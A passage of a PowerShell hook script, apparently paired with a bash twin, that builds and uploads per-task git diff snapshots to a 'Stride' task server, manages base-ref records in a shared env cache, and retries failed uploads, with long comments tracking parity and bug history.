# /api/tasks/<id>/<action>, so the changed_files upload targets the task the
# agent is actually completing even when a hidden claim left a STALE TASK_ID in
# the env cache — the confirmed empty-changed_files root cause (G321/D126: the
# diff was PUT to the previous task). Returns '' for the claim path (whose URL
# has no id); callers fall back to the env-cache TASK_ID then.
# (D220) Shares the ONE parser with routing, so an id can never be scraped out of
# a command that did not actually issue the request — the `echo` that drove a
# live changed_files PUT against task 999999999 went through this path.
function Get-TaskIdFromCommand {
    param([string]$CommandText)
    return (Get-StrideRoute -Phase '' -CommandText $CommandText).TaskId
}

# Fire-and-forget upload of the per-file diff snapshot to the Stride server.
# Mirror of stride-hook.sh's finalize_after_doing PUT path. URL and token are
# resolved by Resolve-StrideApiUrl / Resolve-StrideApiToken — preferring
# $ProjectDir\.stride_auth.md so the upload works whether the agent's
# completion curl used literal values or shell variables ($STRIDE_API_URL /
# $STRIDE_API_TOKEN), with the $Command literal extraction kept as a fallback.
# Silently no-ops if any prerequisite is missing (snapshot file, URL, token,
# TASK_ID) so behavior degrades to the legacy on-disk-only snapshot.
function Invoke-FinalizeAfterDoing {
    if ($HookName -ne 'after_doing') { return }

    # (D127) Target the task id from the /complete URL, not the env cache, so a
    # stale TASK_ID from a hidden claim response cannot route the diff to the
    # wrong task. Fall back to the env-cache TASK_ID only if the URL carries no id.
    # Resolved BEFORE the base choice because the base now depends on which task
    # is completing — the same ordering the bash twin uses.
    $taskId = Get-TaskIdFromCommand -CommandText $Command
    if (-not $taskId) { $taskId = [System.Environment]::GetEnvironmentVariable('TASK_ID', 'Process') }

    # (W2100) BUILD the snapshot. Previously this function returned early when
    # the file was absent, which on native Windows was always — nothing else was
    # ever going to write it. The build runs BEFORE the URL/token preconditions
    # so a snapshot lands on disk even when no upload is possible.
    if (-not $script:SnapBaseResolvedDone) {
        $sel = Resolve-TaskSnapshotBase -TaskId $taskId
        if ($sel.Refused) {
            $script:SnapBaseRefused = $true
            $script:SnapBaseResolved = ''
        } else {
            $script:SnapBaseRefused = $false
            $script:SnapBaseResolved = Resolve-SnapshotBaseTrust -Base $sel.Base
        }
        # (W2102) Compute the attributed ranges ONCE, here, alongside the base -
        # bash does the same inside its SNAP_BASE_RESOLVED_DONE block, so BOTH
        # the pre-loop and post-loop captures use the PRE-LOOP classification.
        # Computing them per call instead would classify the second capture
        # against post-loop HEAD and against a window that closed during
        # after_doing. The outcome happens not to differ today, but this task's
        # point is mirroring the reference, and it also pays for a second full
        # classification per completion.
        $script:SnapOwnRanges = ''
        if (-not $script:SnapBaseRefused) {
            try { $script:SnapOwnRanges = Get-AttributedCommitRange -OwnBase $script:SnapBaseResolved -SelfTaskId $taskId }
            catch { $script:SnapOwnRanges = '' }
        }
        $script:SnapBaseResolvedDone = $true
    }
    # Sweep any capture temp orphaned by a previous run's hard kill. The
    # after_doing budget is a real kill, and a finally block does not survive
    # one, so an orphan holds one file's unified diff until something removes
    # it. It can never be uploaded (the ^\.stride/ rule excludes it), but a
    # project whose gate does `git add -A` would otherwise commit it.
    try {
        $sweepDir = Join-Path $ProjectDir '.stride'
        if (Test-Path -LiteralPath $sweepDir -PathType Container) {
            # Age-gated: only sweep temps older than the after_doing budget.
            # An unconditional sweep would delete a temp a CONCURRENT hook in
            # this same project has open — on POSIX the unlink succeeds while
            # git keeps writing to the unlinked inode, so that run's Test-Path
            # fails and its diff body silently becomes an empty string. That is
            # the silent-loss shape this task exists to end, so the sweep must
            # not create it while cleaning up after it.
            $sweepCutoff = (Get-Date).ToUniversalTime().AddMinutes(-15)
            Get-ChildItem -LiteralPath $sweepDir -Filter 'capture.*' -File -ErrorAction SilentlyContinue |
                Where-Object { $_.LastWriteTimeUtc -lt $sweepCutoff } |
                ForEach-Object { Remove-Item -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue }
        }
    } catch { }

    # (W2102/D255) Record what THIS task's own after_doing loop authored - once
    # per completion, and only when the section actually ran (the empty-section
    # plugin-mode path never sets the flag, so it records nothing and stays
    # byte-identical). '' is recorded DELIBERATELY: "ran and authored nothing"
    # is a fact, distinct from no-record. Written BEFORE the capture so the
    # before_review self-heal on this same completion reads the fresh record,
    # and gated on SnapOwnedRecorded so the early pre-loop call can never
    # consume a stale record from a previous completion of this id.
    if ($script:SnapOwnedLoopRan -and -not $script:SnapOwnedRecorded -and $taskId) {
        $script:SnapOwnedSet = Get-OwnedCommitSet -H0 $script:SnapOwnedH0 -H1 $script:SnapOwnedH1
        $null = Set-TaskOwnedRecord -TaskId $taskId -Value $script:SnapOwnedSet
        $script:SnapOwnedRecorded = $true
    }
    # (W2102/D273) Stamp the SAFE default BEFORE the capture runs, not just the
    # real verdict after it - the same write-before-capture guarantee the owned
    # record takes above, and for the same reason. Without it a completion
    # killed inside the capture (exactly what the self-heal exists for) can
    # leave a PREVIOUS window's `yes` on record for the retry to replay,
    # narrowing a window whose verdict was never computed.
    $narrowed = 'no'
    if ($taskId) { $null = Set-TaskNarrowedRecord -TaskId $taskId -Value $narrowed }

    $snapshot = '[]'
    if (-not $script:SnapBaseRefused) {
        # (W2102/D236+D244+D256) The attributed ranges for THIS task, computed
        # once above with the base and reused by both captures, as bash does.
        $capRanges = $script:SnapOwnRanges
        # (D255/D271) When this completion's own loop authored commits, its
        # committed contribution is exactly that delta plus the working tree,
        # and commits in base..H0 - an outer task's mid-window work, or this
        # task's own pre-hook manual commits - fall out. That trade is safe ONLY
        # while some OTHER window is still open, because a nested task's dropped
        # commits fall back into the enclosing task's later snapshot: the
        # documented over-report.
        #
        # An OUTERMOST task has no absorber, and the same narrowing silently
        # UNDER-reported its own manual mid-task commits. So with no other open
        # window the owned range is UNIONED with the attributed ranges instead
        # of replacing them: the ranges were computed before the loop ran, so
        # the loop's own commits are in none of them and are no longer
        # uncommitted by capture time - replacing would trade losing the manual
        # commits for losing the sweep's.
        if ($script:SnapOwnedRecorded -and $script:SnapOwnedSet -and
            $script:SnapOwnedSet -ne $script:StrideOwnedOverflow) {
            $ownedRange = Convert-OwnedSetToRange -Set $script:SnapOwnedSet
            if ($ownedRange) {
                if (Test-AnotherOpenWindowExists -SelfTaskId $taskId) {
                    $capRanges = $ownedRange
                    $narrowed = 'yes'
                } elseif ($capRanges) {
                    # No sentinel exclusion here, matching bash exactly.
                    # Expand-OwnRanges SKIPS a sentinel line, so appending a
                    # real range to it expands to just that range - which is
                    # bash's behaviour. Excluding the sentinel instead would
                    # emit an EMPTY snapshot where bash emits the loop's own
                    # commits: the one direction this design forbids, a
                    # narrower snapshot. Effectively unreachable (the sentinel
                    # needs every commit covered, and the loop's own commits are
                    # the newest so no other window's head can cover them) - but
                    # "unreachable" is not a reason to diverge from the twin.
                    $capRanges = $capRanges.TrimEnd("`n") + "`n" + $ownedRange
                }
            }
        }
        try { $snapshot = Build-ChangedFilesSnapshot -Base $script:SnapBaseResolved -OwnRanges $capRanges }
        catch { $snapshot = '[]' }
    }
    Write-ChangedFilesSnapshot -Json $snapshot

    # (W2102/D236) Stamp where THIS task's commits stop, so an outer task
    # completing later can subtract this window. Written AFTER the capture so
    # it records the HEAD the snapshot was actually taken against.
    if ($taskId) { $null = Set-TaskHeadRefRecord -TaskId $taskId }
    # (W2102/D273) Stamp the verdict this capture reached, next to the head it
    # was taken against and BEFORE any PUT is attempted.
    if ($taskId) { $null = Set-TaskNarrowedRecord -TaskId $taskId -Value $narrowed }

    $apiBase = Resolve-StrideApiUrl
    $token = Resolve-StrideApiToken
    if (-not $apiBase -or -not $token -or -not $taskId) { return }

    $httpCode = Invoke-ChangedFilesUpload -TaskId $taskId -ApiBase $apiBase -Token $token
    # (W1094) Record the outcome after EVERY PUT attempt so the before_review
    # self-heal can verify it on a fresh timeout budget. A skipped PUT
    # (missing preconditions) deliberately writes nothing: missing state
    # means "no healthy upload on record" and the retry re-checks the same
    # preconditions itself.
    Write-DiffUploadState -TaskId $taskId -HttpCode $httpCode `
        -Base $script:SnapBaseResolved -Narrowed $narrowed
}

# (D142) Rewrite TASK_BASE_REF — and re-record the dirty baseline — AFTER the
# ## before_doing section has run. Mirror of stride-hook.sh's
# finalize_before_doing: the section's `git pull` moves HEAD, so a base
# captured before it anchors the after_doing diff at the PRE-pull commit and
# the snapshot spans another clone's pulled work (the D132/W1678 incident).
# Called from the main flow right after Invoke-StrideSection returns for the
# before_doing route, regardless of the section's exit code (the claim
# already succeeded — PostToolUse cannot veto it). Skips silently when HEAD
# is unresolvable (not a git repo) — the pre-section strip already removed
# any inherited TASK_BASE_REF in that case.
# (D226/W2100) PARITY NOTE. Read this before assuming either script does what
# the other does. An earlier version claimed this script had "no read half to
# fix"; a later one claimed there was "no diff built on this side to refuse".
# Each was true when written and false within a release. This is the current
# division, and it is a list, not a blanket claim.
#   WRITE half — a nested claim overwriting the shared TASK_BASE_REF happens
#     identically to the bash twin, and is mirrored below.
#   READ half — Invoke-ChangedFilesUpload reads TASK_BASE_REF to drive D142's
#     committed-range override, preferring this task's own per-task record.
#   BUILD half — (W2100) this script now BUILDS the snapshot instead of only
#     uploading one it assumed someone else had written.
#     Build-ChangedFilesSnapshot mirrors stride-hook.sh's capture_changed_files,
#     Expand-OwnRanges mirrors expand_own_ranges, and Invoke-FinalizeAfterDoing
#     writes the result to .stride-changed-files.json before the PUT. Before
#     W2100 a NATIVE Windows run produced NO snapshot at all, silently:
#     stride-hook.sh execs this script and exits, so nothing else was ever
#     going to write one.
#   REFUSAL — now has a subject, so it is ported. Resolve-TaskSnapshotBase
#     mirrors select_task_snapshot_base including BOTH refusals (a shared base
#     stamped by another task; an unproven base with no per-task record), and a
#     refusal writes '[]' rather than another task's diff.
#   TRUST GUARD — Resolve-SnapshotBaseTrust mirrors resolve_snapshot_base's
#     D142 rules (empty/unresolvable, not an ancestor of HEAD, older than the
#     task branch point), with TASK_BASE_REF_TRUSTED exempting rule 3.
#   ONE DELIBERATE DIVERGENCE, in this side's favour — Get-NumstatBinarySet
#     reads `--numstat -z` and takes the rename DESTINATION. Plain --numstat
#     prints a COMPACTED path for a rename ("a/{ => b}/f") that matches no path
#     --name-only emits, so the bash twin cannot flag a renamed BINARY and
#     captures "Binary files ... differ" as its diff body instead. Pinned by
#     test 21aa.
# NOT PORTED, deliberately, and what it costs:
#   * (D277) THE UPLOAD ITSELF IS NOW UNBLOCKED ON 5.1, and this entry moved out
#     of NOT PORTED rather than being deleted, so the history of the claim stays
#     readable. It used to say: Invoke-ChangedFilesUpload calls
#     Invoke-WebRequest -SkipHttpErrorCheck, which is PowerShell 7.0+, so on
#     Windows PowerShell 5.1 parameter binding fails BEFORE the request is
#     issued and the PUT never happens — recorded as '000', indistinguishable
#     from a refused connection; W2100 made a native-Windows run WRITE a
#     snapshot without making it UPLOAD one. D277 removed the parameter from
#     both call sites, so a non-2xx now throws on either host and
#     Get-WebExceptionStatus recovers the real code, with a transport failure
#     still yielding '000'. Test group 30 in test-stride-hook.ps1 is the
#     regression cover: an AST walk checking each command's named parameters
#     against a per-cmdlet DENYLIST, alias-resolved. A denylist is by definition
#     incomplete — it catches what someone has learned to list, which is more
#     than the name-only gate sees but is not "the whole class", and an earlier
#     draft of this very comment said it was. Still NOT claimed: nobody has ever EXECUTED this file under
#     powershell.exe (D237), so this is a removed blocker, not a verified 5.1
#     run. Say that plainly rather than letting "the upload is unblocked" read
#     as end-to-end parity — that over-claim is the exact shape this comment
#     keeps having to correct.
#   * (W2102) THE NARROWING ORCHESTRATION IS NOW PORTED, and this entry moved
#     out of NOT PORTED rather than being deleted, so the history of the claim
#     stays readable. Get-AttributedCommitRange mirrors attributed_commit_ranges
#     (D236 windows, the D244 purity heuristic and the D256 fixpoint over it),
#     Get-OwnedCommitSet and Convert-OwnedSetToRange mirror compute_owned_set
#     and owned_set_to_range, Test-AnotherOpenWindowExists mirrors
#     another_open_window_exists with its D273 age horizon, and the four
#     Set-Task*Record writers now have production call sites in
#     Invoke-FinalizeAfterDoing. The D273 claim stamp is written inline in
#     Invoke-FinalizeBeforeDoing, as bash writes it. Covered by test Group 24;
#     test 22r records the call-site inventory and the provenance of each value.
#     The over-report this entry used to describe - an OUTER task's snapshot
#     containing its NESTED tasks' commits - is closed on this host.
#   * The self-heal RE-capture. Invoke-SelfHealChangedFilesUpload builds a
#     snapshot only when none is on disk (a completion killed inside the
#     after_doing budget) and never re-captures over one that is already
#     there, where bash re-captures unconditionally. A snapshot on disk IS
#     the primary capture's answer; rebuilding it would re-derive against
#     retry-time state, which is the divergence D273 added persistence to
#     prevent. This is the honest remaining subset.
#     (W2103) The reason this bullet USED to give - that there was nothing to
#     replay from, because no base= or narrowed= was persisted - is gone:
#     both are written now, and the replay is ported and used.
#     (W2103) The self-heal now applies the D255 owned-set override too, gated
#     on the REPLAYED verdict rather than a live re-derivation - which is what
#     W2102 could not do and recorded as blocked. Bash applies it at the same
#     point on the same basis.
#   * (W2103) THE D268/D274 EVICTION POLICY IS NOW PORTED, moved out of NOT
#     PORTED rather than deleted so the history of the claim stays readable.
#     Select-KeptWindowRecord and Get-DeadOpenWindowId replace both count caps.
#     Open windows are never evicted by count - the only ones removed are those
#     the sweep PROVED dead, and it proves that from non-resolution ALONE. It
#     deliberately does not check ancestry or the age stamp the way
#     Test-AnotherOpenWindowExists does: ancestry is a property of where HEAD
#     points right now, so a bisect or detached checkout would make a live
#     outer's base look dead, and deleting a record is not recoverable when HEAD
#     comes back. Covered by test Group 25, whose 25c pins exactly that.
#   * (W2103) THE D273 REPLAY IS NOW PORTED TOO. Write-DiffUploadState persists
#     base= and narrowed=, Resolve-CaptureNarrowing prefers the per-task record
#     over that file (the file holds one task and is truncated on every write,
#     so an interleaved completion erases it exactly when it is needed), and
#     Invoke-ReplayNarrowingDecision replays the verdict instead of re-deriving
#     it. The self-heal now uses it, which is what the persistence is for.
#   * (W2102) CONCURRENT CACHE WRITES, filed as D282. Set-TaskRecord reads the
#     whole cache, filters one key and REWRITES the file, with no lock - and
#     W2102 gave it production call sites that span the whole after_doing gate,
#     so a claim landing between the read and the rename is now lost wholesale.
#     (W2106) THIS ENTRY USED TO SAY "bash is not exposed: its record writers
#     APPEND". That is FALSE and is corrected rather than deleted. All four
#     bash record writers (stride-hook.sh:1362, :1436, :1894, :2597) pipe
#     `grep -v "^KEY="` into write_env_cache, which is mktemp -> cat -> mv -f
#     (:1238-1262) - the same unlocked read-filter-rewrite. The only genuine
#     `>> "$ENV_CACHE"` is the awk-failure fallback at :3686. So D282 is a
#     SHARED exposure, not a ps1-only one, and the claim that closing it moves
#     the implementations closer together was resting on a difference that does
#     not exist. The dominant outcome is still safe (the reverted cache carries
#     the previous window's OWNER or _UNPROVEN, so the base is refused and an
#     empty snapshot is uploaded), and the residue is still a cache whose
#     identity lines name the PREVIOUS task - on both executors.
#   * (W2102) One DELIBERATE DIVERGENCE in the retention re-emit. Bash carries
#     head/owned across a rewrite as raw lines out of select_kept_window_records;
#     Get-CarriedWindowRecordLine carries all four families through
#     Read-TaskRecord + ConvertTo-ShSingleQuoted instead, because that selector
#     is not ported and because D280's rule is that no raw line enters a
#     rewrite. A malformed head/owned value is therefore DROPPED here and KEPT
#     by bash. Fail-closed direction, and it self-heals on the next window.
#   * (W2106) WHAT IS LEFT, at the close of G413, so this list can be read as
#     finished rather than merely long. The capture, attribution, eviction and
#     replay machinery is ported and covered. Three things are NOT, and none
#     of them can be closed from this host. ONE OF THE THREE SINCE HAS BEEN,
#     and is kept here marked rather than removed, because a list that only ever
#     grows is a list nobody trusts:
#       - [CLOSED by D277] THE 7-ONLY -SkipHttpErrorCheck, at BOTH
#         Invoke-WebRequest call sites — Invoke-ChangedFilesUpload and
#         Invoke-AfterGoalDetectionViaApi. The first meant a native-Windows run
#         WROTE a snapshot and still could not PUT one. The SECOND is easy to
#         miss and was: that call sits under `catch { return }`, so on 5.1 the
#         D119 after_goal detection guarantee degraded to a SILENT no-op on
#         every run. Two consequences, one parameter, and the reason "Windows
#         parity" must not be claimed unqualified. The parameter is gone from
#         both sites; test group 30 fails if it — or any other parameter ON ITS
#         DENYLIST, written plainly or through an alias — returns anywhere in
#         hooks/*.ps1 or scripts/*.ps1. Extending that denylist is how a
#         newly-learned parameter gets pinned; it is not a check that knows
#         every 7-only parameter there is. No line numbers are cited here on purpose — the two this entry used to name
#         had both drifted onto unrelated code by the time D277 was worked.
#       - RUNTIME VERIFICATION ON A REAL 5.1 HOST (D237). Every check that
#         exists here is STATIC: scripts/check-ps1-compat.sh reads syntax and
#         cmdlet names, and the ps1 suite runs on pwsh 7. Neither executes this
#         file under powershell.exe. The verified blind spots are listed in
#         README.md under "What this gate cannot see" - D277 was found by
#         reading, not by a red gate, which is the proof that reading is what
#         has been doing this job.
#       - refused_base=yes, unported at both write sites (see the parity note
#         in test-stride-hook.ps1's Group 24 ledger). Diagnostic only.
#       - (D289) THE POST-WRITE EXPORTS ARE GATED HERE AND UNCONDITIONAL IN
#         BASH. This side skips the five TASK_BASE_REF* process exports and
#         Write-DirtyBaseline when the rewrite does not commit; bash pipes into
#         `write_env_cache || true` and exports regardless. For the splitter
#         throw the two agree - bash returns early on _rebuild_ok=0 - so the
#         divergence is the plain write-failure and swap-refusal cases only, and
#         it runs FAIL-CLOSED: this side declines to assert a trusted, owned
#         base it did not persist, where bash asserts one. Listed because the
#         instruction below is to list, not because the direction is in doubt.
# Keep this list honest and specific. Every blanket parity claim this comment
# has ever made was false within one release.
function Invoke-FinalizeBeforeDoing {
    if ($HookName -ne 'before_doing') { return }
    $baseRef = ''
    try {
        $rev = & git -C $ProjectDir rev-parse HEAD 2>$null
        if ($LASTEXITCODE -eq 0 -and $rev) { $baseRef = ($rev | Out-String).Trim() }
    } catch {
        $baseRef = ''
    }
    if (-not $baseRef) { return }
    try {
        # TASK_BASE_REF_TRUSTED marks a base written by THIS post-before_doing
        # capture (the task branch point by construction) — the bash twin's
        # resolve_snapshot_base skips its branch-point rule for marked bases.
        # (D226) An owner stamp and a per-task record ride alongside the shared
        # keys, and earlier tasks' records are carried across, so a nested
        # claim cannot make an outer task's anchor unrecoverable.
        #
        # Stamped ONLY when this call's own response proved the identity (see
        # the gate in the claim block). Withholding costs nothing: the task
        # falls back to the shared TASK_BASE_REF, which on its own claim is
        # genuinely its own base. Stamping from an unproven identity is what
        # makes the refusal fire on the wrong side.
        $owner = ''
        $ownerKey = ''
        if ($script:TaskIdentityRefreshed) {
            $owner = $script:TaskOwnerId
            if ($owner) {
                # (D269) Digits-only, mirroring the bash twin's task_record_key.
                # The -replace below is NOT injective: two ids differing only in
                # punctuation ('42-x' and '42.x') both become '42_x' and would
                # SHARE a per-task record, letting one task's completion consume
                # another's. A task id is an integer -- documented in
                # docs/api/get_tasks.md and enforced by the schema's default
                # Ecto integer primary key -- so refusing a non-integer removes
                # the collision at its source rather than re-encoding around it.
                # Refusing means writing no per-task record, which degrades to
                # the shared-base path exactly as a reserved word does.
                # The per-task keys share a namespace with the TRUSTED, OWNER
                # and UNPROVEN markers; an id sanitizing to one would set it
                # from data. Unreachable for a digits-only id, kept because it
                # is what keeps this safe if the id rule is ever widened.
                # (D269) UNPROVEN was missing from this guard while the bash
                # twin has excluded it since D226 -- a divergence the shared
                # namespace made invisible.
                # (W2101) All three steps now come from Get-TaskRecordKey, which
                # returns '' for exactly the cases this block returned no key
                # for. Same inputs, same outputs; one copy instead of two.
                $ownerKey = Get-TaskBaseRefKey -TaskId $owner
            }
            if (-not $ownerKey) { $owner = '' }
        }
        # (D289) Under the compare-and-swap. This read and the write at the end
        # of the block are separated by the whole preserve/evict/re-emit build,
        # and Invoke-FinalizeBeforeDoing runs at claim time - exactly when a
        # second agent's record write is most likely to land. Retrying re-runs
        # the selector against the concurrent writer's cache, so its records are
        # carried across the rebuild rather than replaced by it.
        $finalizeWrote = Invoke-EnvCacheRewrite -What 'the claim base-ref capture' -Build {
        param($before)
        $preserved = @()
        $records = @()
        if ($null -ne $before) {
            # (D280 r2) Pass-through re-emit — Get-EnvCacheLine, not Get-Content.
            $g280recsF = Split-EnvCacheRecord
            if (-not $g280recsF.Ok) { throw 'env cache ends inside a quoted value' }
            $existing = @($g280recsF.Records)
            $preserved = @($existing | Where-Object {
                $_ -notmatch '^TASK_BASE_REF=' -and
                $_ -notmatch '^TASK_BASE_REF_TRUSTED=' -and
                $_ -notmatch '^TASK_BASE_REF_OWNER=' -and
                $_ -notmatch '^TASK_BASE_REF_UNPROVEN=' -and
                $_ -notmatch '^TASK_BASE_REF_[A-Za-z0-9_]+=' -and
                # (W2102) The four partner families are excluded here because
                # Get-CarriedWindowRecordLine below RE-EMITS them. Leaving them
                # in $preserved as well would write each record twice - the
                # passthrough copy and the re-emitted one - and a duplicate
                # record is not harmless: last-match-wins means the two copies
                # must agree forever, and the passthrough copy is exactly the
                # raw line the re-emit exists to avoid trusting.
                $_ -notmatch '^TASK_HEAD_REF_[A-Za-z0-9_]+=' -and
                $_ -notmatch '^TASK_OWNED_[A-Za-z0-9_]+=' -and
                $_ -notmatch '^TASK_BASE_AT_[A-Za-z0-9_]+=' -and
                $_ -notmatch '^TASK_NARROWED_[A-Za-z0-9_]+='
            })
            # (W2103/D268+D274) Per-window eviction, replacing the tail-19
            # cap. $ownerKey is RESERVED: this branch appends a fresh base
            # record for the completing task itself, so the selector both
            # excludes that line and drops its sweep threshold by one - the
            # same reserved-slot arithmetic the old cap expressed as 19
            # rather than 20.
            $records = @(Select-KeptWindowRecord -ReserveKey $ownerKey)
        }
        # (D280) Quoted for parity with the bash twin, which sq_escapes all five
        # of these — including TASK_BASE_REF_TRUSTED, which it writes as the
        # quoted literal '1'. These values are locally derived rather than
        # server-supplied ($baseRef is `git rev-parse HEAD`, $owner is gated to
        # digits), so this is the lowest-risk of the three write sites. It is
        # quoted anyway because the acceptance criterion is that EVERY writer
        # escapes: an unescaped writer left in place is the next reader's
        # counter-example, and a rule with one exception stops being checkable.
        # $preserved and $records are raw lines already on disk — passed through
        # verbatim, never re-escaped.
        # (W2102) Partner records for every surviving window, re-emitted. Self's
        # base is already dropped via $ownerKey, so self's partners drop with it
        # automatically. On the unproven path ($ownerKey empty) self's verdict
        # survives - the deliberate trade bash documents at the same point.
        $newLines = $preserved + $records +
            (Get-CarriedWindowRecordLine -BaseRecordLine $records) +
            ("TASK_BASE_REF=" + (ConvertTo-ShSingleQuoted -Value $baseRef)) +
            ("TASK_BASE_REF_TRUSTED=" + (ConvertTo-ShSingleQuoted -Value '1'))
        if ($ownerKey) {
            $newLines = $newLines +
                ("TASK_BASE_REF_OWNER=" + (ConvertTo-ShSingleQuoted -Value $owner)) +
                ("$ownerKey=" + (ConvertTo-ShSingleQuoted -Value $baseRef))
            # (W2102/D273) Stamp this window's OPEN TIME next to the base it
            # dates, from the same validated owner id. Test-AnotherOpenWindow-
            # Exists ages a record out by this stamp rather than by the base
            # commit's committer time, because committer time measures when the
            # repo last moved, not when the claim happened - a task claiming on
            # an already-old HEAD would read as abandoned from its first nested
            # completion onward, silently disabling the narrowing in the common
            # case. An unstampable clock leaves NO line, which the predicate
            # reads as dead: the safe direction.
            #
            # Written INLINE rather than through Set-TaskBaseAtRecord, mirroring
            # bash, which also emits it inline here. The writer re-reads and
            # rewrites the cache file, and this block is mid-construction of the
            # very array about to be written - calling it here would write the
            # file twice and race its own output.
            $atKey = Get-TaskBaseAtKey -TaskId $owner
            if ($atKey) {
                $epochStart = New-Object DateTime 1970, 1, 1, 0, 0, 0, ([DateTimeKind]::Utc)
                $atNow = [string][int64][math]::Floor(([DateTime]::UtcNow - $epochStart).TotalSeconds)
                if ($atNow -match '^[0-9]+\z') {
                    $newLines = $newLines + ("$atKey=" + (ConvertTo-ShSingleQuoted -Value $atNow))
                }
            }
        } else {
            # (D226) Marks a base written without a provable owner, so a later
            # completion can tell it apart from a pre-fix cache. Mirrors the
            # bash twin's TASK_BASE_REF_UNPROVEN.
            # (D280) Quoted, like the twin's `echo "TASK_BASE_REF_UNPROVEN='1'"`.
            $newLines = $newLines + ("TASK_BASE_REF_UNPROVEN=" + (ConvertTo-ShSingleQuoted -Value '1'))
        }
        return @($newLines)
        }
        # (D289) GATED ON THE WRITE, and this is a control-flow regression the
        # refactor introduced rather than a new nicety. Before D289 the
        # splitter's `throw 'env cache ends inside a quoted value'` propagated
        # to this function's catch and skipped BOTH the exports below and the
        # dirty baseline; the helper now swallows that throw, so without this
        # gate execution would continue and assert a TRUSTED, OWNED base into
        # the process environment that was never persisted - while the cache
        # still holds the concurrent writer's anchor, or the previous window's.
        # The same applies to the two refusal outcomes the helper added: swap
        # exhaustion and an unreadable cache.
        #
        # Downstream this failed closed rather than open (Resolve-TaskSnapshotBase
        # refuses on an owner mismatch or an UNPROVEN marker, so the loser gets
        # an empty snapshot rather than another task's diff), which is why it is
        # a low finding and not a high one. It is still a process asserting a
        # base it did not write, and the gate costs one branch.
        if (-not $finalizeWrote) {
            [Console]::Error.WriteLine('stride-hook: the env-cache base capture did not commit; not exporting a trusted base for this process')
            return
        }
        [System.Environment]::SetEnvironmentVariable('TASK_BASE_REF', $baseRef, 'Process')
        [System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_TRUSTED', '1', 'Process')
        if ($ownerKey) {
            [System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_OWNER', $owner, 'Process')
            [System.Environment]::SetEnvironmentVariable($ownerKey, $baseRef, 'Process')
            [System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_UNPROVEN', $null, 'Process')
        } else {
            [System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_UNPROVEN', '1', 'Process')
            [System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_OWNER', $null, 'Process')
        }
        # (W1457→D142) The dirty baseline moves with the base capture:
        # post-pull paths hashed against the post-pull base, so the exclusion
        # set and the diff anchor can never disagree.
        Write-DirtyBaseline -BaseRef $baseRef
    } catch {
        # Best-effort — a failed rewrite must never block the hook.
    }
}

# (W1094) Self-heal for the changed_files upload — mirror of
# stride-hook.sh's self_heal_changed_files_upload. The after_doing gate can
# burn the whole 600s hook budget, killing the process before or during the
# snapshot PUT — or the PUT itself returned non-2xx. before_review
# (PostToolUse on the same completion curl) runs on a FRESH budget, so it
# verifies the recorded outcome and re-PUTs the on-disk snapshot when no
# healthy upload is on record for the current task. Best-effort: never
# throws, never changes the hook's exit semantics.
#
# (W2100) It BUILDS a snapshot when none is on disk — the case where the
# after_doing gate was killed before the capture ran. It deliberately does NOT
# re-capture over an existing snapshot, unlike the bash twin.
#
# (W2103) THE REASON FOR THAT CHANGED, and the old one is corrected here rather
# than left standing: this header used to say Write-DiffUploadState recorded no
# base= or narrowed= line to replay from. It does now, and the body below reads
# narrowed= and replays it. What remains unported is only the RE-capture over an
# EXISTING snapshot — a snapshot already on disk is the primary capture's answer
# for a window that has since moved on, and rebuilding it here would re-derive
# against retry-time state rather than replay a capture-time fact.
# Build-if-absent stays the honest subset.
function Invoke-SelfHealChangedFilesUpload {
    if ($HookName -ne 'before_review') { return }
    $snapshotPath = Join-Path $ProjectDir '.stride-changed-files.json'
    # (D127) Prefer the task id from the /complete URL over the env-cache TASK_ID
    # so the self-heal re-PUTs to the CORRECT task even after a stale claim.
    $taskId = Get-TaskIdFromCommand -CommandText $Command
    if (-not $taskId) { $taskId = [System.Environment]::GetEnvironmentVariable('TASK_ID', 'Process') }
    if (-not $taskId) { return }

    # Healthy 2xx recorded for THIS task → do not re-upload (snapshot
    # semantics anchor at after_doing time; avoid pointless API load).
    # Missing file, different task id, or non-2xx/empty code → retry.
    $stateFile = Join-Path $ProjectDir '.stride-diff-upload-state'
    $stateTask = ''
    $stateCode = ''
    $stateNarrowed = ''
    $stateBase = ''
    if (Test-Path $stateFile) {
        try {
            foreach ($line in Get-Content -Path $stateFile -Encoding UTF8) {
                if ($line -match '^task_id=(.*)$' -and -not $stateTask) { $stateTask = $Matches[1] }
                if ($line -match '^http_code=(.*)$' -and -not $stateCode) { $stateCode = $Matches[1] }
                # (W2103/D273) The persisted verdict, the resolver's SECOND
                # source behind the per-task record. GATED ON task_id BELOW -
                # the file holds ONE task and is truncated on every write, so an
                # interleaved completion leaves ANOTHER task's verdict here.
                # Replaying that would narrow a window whose verdict was never
                # computed, or widen one that was. bash gates the same read on
                # the same terms.
                if ($line -match '^narrowed=(.*)$' -and -not $stateNarrowed) { $stateNarrowed = $Matches[1] }
                # (W2103) The base the primary capture anchored at, read and
                # gated on exactly the same terms as the verdict beside it. Not
                # consumed as a revision on THIS side - it is carried through
                # the truncating write below so the record survives the retry.
                if ($line -match '^base=(.*)$' -and -not $stateBase) { $stateBase = $Matches[1] }
            }
        } catch {
            # Unreadable state degrades to "retry".
        }
    }
    # Only a record for THIS task may speak for this capture. Dropping a
    # foreign verdict leaves $stateNarrowed empty, which Resolve-CaptureNarrowing
    # reports as "no verdict on record" and the replay turns into a live check -
    # the documented fall-through, and the safe answer.
    if ($stateTask -ne $taskId) { $stateNarrowed = ''; $stateBase = '' }
    if ($stateTask -eq $taskId -and $stateCode -match '^2') { return }

    $apiBase = Resolve-StrideApiUrl
    $token = Resolve-StrideApiToken
    if (-not $apiBase -or -not $token) { return }

    # (W2100) Build only when nothing is on disk — the after_doing gate was
    # killed before its capture ran. An existing snapshot is left byte-for-byte
    # alone; see this function's header for why re-capturing here would be
    # worse than not.
    # (W2103/D273) Declared BEFORE the conditional build so the state write at
    # the end of this function is defined on EVERY path. The build below runs
    # only when nothing is on disk; on the ordinary retry path - a snapshot
    # already exists and is left byte-for-byte alone - there is no fresh base or
    # verdict to derive, so both are seeded from what the file already held.
    # THE WRITE AT THE END TRUNCATES, so seeding with '' would not "leave the
    # record alone" - it would DELETE the base the primary capture persisted,
    # on the one path that never computes a replacement. It is consumed as well
